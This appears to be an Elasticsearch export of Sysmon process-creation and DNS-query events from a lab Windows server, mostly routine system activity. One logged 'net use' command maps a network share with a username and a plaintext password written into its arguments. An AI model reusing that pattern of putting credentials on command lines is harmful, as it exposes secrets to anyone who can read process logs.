"May 28, 2026 @ 12:12:25.733"	"lRDbbZ4ByrYY_kgLW4Aa"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:12:26.821"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:12:25.732
ProcessGuid: {6e4a868b-06f9-6a18-6001-000000002300}
ProcessId: 1924
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" use \\192.168.1.218\share /user:osher Password123
CurrentDirectory: C:\Users\Administrator\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ParentProcessId: 1192
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\net.exe"" use \\192.168.1.218\share /user:osher Password123"	"Microsoft Corporation"	"C:\Users\Administrator\"	"Net Command"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07"	"C:\Windows\System32\net.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"net.exe"	"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	"LAB2019\Administrator"	"{6e4a868b-06f9-6a18-6001-000000002300}"	1924	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:12:25.732"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17346	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:12:25.056"	"lBDbbZ4ByrYY_kgLW4Aa"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:12:26.821"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:12:25.052
ProcessGuid: {6e4a868b-06f9-6a18-5f01-000000002300}
ProcessId: 688
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" use \\192.168.1.218\share /delete
CurrentDirectory: C:\Users\Administrator\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ParentProcessId: 1192
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\net.exe"" use \\192.168.1.218\share /delete"	"Microsoft Corporation"	"C:\Users\Administrator\"	"Net Command"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07"	"C:\Windows\System32\net.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"net.exe"	"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	"LAB2019\Administrator"	"{6e4a868b-06f9-6a18-5f01-000000002300}"	688	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:12:25.052"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17345	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:12:05.476"	"ihDbbZ4ByrYY_kgLG4BV"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:12:06.807"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:12:05.472
ProcessGuid: {6e4a868b-06e5-6a18-5e01-000000002300}
ProcessId: 2784
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" use
CurrentDirectory: C:\Users\Administrator\
User: LAB2019\Administrator
LogonGuid: {6e4a868b-015d-6a18-d703-070000000000}
LogonId: 0x703D7
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07
ParentProcessGuid: {6e4a868b-0271-6a18-dc00-000000002300}
ParentProcessId: 1192
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: LAB2019\Administrator"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\system32\net.exe"" use"	"Microsoft Corporation"	"C:\Users\Administrator\"	"Net Command"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=AE61D8F04BCDE8158304067913160B31,SHA256=25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07"	"C:\Windows\System32\net.exe"	" - "	High	"{6e4a868b-015d-6a18-d703-070000000000}"	0x703d7	"net.exe"	"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" "	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	"{6e4a868b-0271-6a18-dc00-000000002300}"	1192	"LAB2019\Administrator"	"{6e4a868b-06e5-6a18-5e01-000000002300}"	2784	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	1	"LAB2019\Administrator"	"2026-05-28 09:12:05.472"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17344	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:48.908"	"PhDYbZ4ByrYY_kgLEoDN"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:08:50.702"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:08:48.907
ProcessGuid: {6e4a868b-0620-6a18-5a01-000000002300}
ProcessId: 7056
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.17763.1852 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"taskhostw.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Tasks"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1852 (WinBuild.160101.0800)"	" - "	"MD5=8BD7B08DA6BCA54DF9B595E4D9281BEB,SHA256=DE85F29A8BC7219F10A4AC88654C3901ABC329D7505B21CD95CBF780D1EBCCF4,IMPHASH=9839C7FD9649496B162F72128209528A"	"C:\Windows\System32\taskhostw.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"taskhostw.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0620-6a18-5a01-000000002300}"	7056	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:08:48.907"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17343	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:35.064"	"OhDXbZ4ByrYY_kgL5YC5"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:08:36.693"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:08:35.063
ProcessGuid: {6e4a868b-0613-6a18-5701-000000002300}
ProcessId: 6200
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0613-6a18-5701-000000002300}"	6200	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:08:35.063"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17342	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:33.248"	"OBDXbZ4ByrYY_kgLu4Ap"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:08:34.692"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:08:31.968
ProcessGuid: {6e4a868b-013f-6a18-5900-000000002300}
ProcessId: 4384
QueryName: WIN-JOCP945SK51
QueryStatus: 0
QueryResults: ::1;::ffff:192.168.1.251;
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
User: NT AUTHORITY\NETWORK SERVICE"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\wbem\WmiPrvSE.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-013f-6a18-5900-000000002300}"	4384	" - "	" - "	"WIN-JOCP945SK51"	"::1;::ffff:192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\NETWORK SERVICE"	"2026-05-28 09:08:31.968"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17341	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:32.034"	"NRDXbZ4ByrYY_kgLu4Ap"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:08:33.690"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:08:32.028
ProcessGuid: {6e4a868b-0610-6a18-5401-000000002300}
ProcessId: 6008
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {6e4a868b-05df-6a18-2f01-000000002300}
ParentProcessId: 3872
ParentImage: C:\Windows\System32\CompatTelRunner.exe
ParentCommandLine: C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:S/Or7WTm+kG0fAvv.2
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host ""Final result:"", $res"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows PowerShell"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F"	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"PowerShell.EXE"	"C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:S/Or7WTm+kG0fAvv.2"	"C:\Windows\System32\CompatTelRunner.exe"	"{6e4a868b-05df-6a18-2f01-000000002300}"	3872	"NT AUTHORITY\SYSTEM"	"{6e4a868b-0610-6a18-5401-000000002300}"	6008	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:08:32.028"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17338	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:31.246"	"MxDXbZ4ByrYY_kgLu4Ap"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:08:32.688"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:08:30.257
ProcessGuid: {6e4a868b-013f-6a18-5900-000000002300}
ProcessId: 4384
QueryName: WIN-JOCP945SK51.lab2019.local
QueryStatus: 0
QueryResults: ::1;::ffff:192.168.1.251;
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
User: NT AUTHORITY\NETWORK SERVICE"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\wbem\WmiPrvSE.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-013f-6a18-5900-000000002300}"	4384	" - "	" - "	"WIN-JOCP945SK51.lab2019.local"	"::1;::ffff:192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\NETWORK SERVICE"	"2026-05-28 09:08:30.257"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17336	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:31.059"	"MhDXbZ4ByrYY_kgLu4Ap"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:08:32.688"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:08:31.054
ProcessGuid: {6e4a868b-060f-6a18-5201-000000002300}
ProcessId: 6148
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {6e4a868b-05df-6a18-2f01-000000002300}
ParentProcessId: 3872
ParentImage: C:\Windows\System32\CompatTelRunner.exe
ParentCommandLine: C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:S/Or7WTm+kG0fAvv.2
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows PowerShell"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.1 (WinBuild.160101.0800)"	" - "	"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F"	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"PowerShell.EXE"	"C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:S/Or7WTm+kG0fAvv.2"	"C:\Windows\System32\CompatTelRunner.exe"	"{6e4a868b-05df-6a18-2f01-000000002300}"	3872	"NT AUTHORITY\SYSTEM"	"{6e4a868b-060f-6a18-5201-000000002300}"	6148	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:08:31.054"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17335	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:08:31.039"	"MRDXbZ4ByrYY_kgLu4Ap"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:08:32.688"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:08:31.037
ProcessGuid: {6e4a868b-060f-6a18-5101-000000002300}
ProcessId: 5348
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-060f-6a18-5101-000000002300}"	5348	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:08:31.037"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17334	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
